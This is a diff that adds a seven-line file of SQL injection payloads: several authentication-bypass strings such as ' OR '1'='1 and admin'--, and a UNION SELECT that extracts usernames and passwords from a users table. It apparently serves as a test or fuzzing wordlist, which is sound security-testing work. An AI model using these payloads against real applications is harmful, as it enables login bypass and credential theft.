@@ -1,0 +1,7 @@
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+admin'--
+1 OR 1=1
+UNION SELECT username, password FROM users
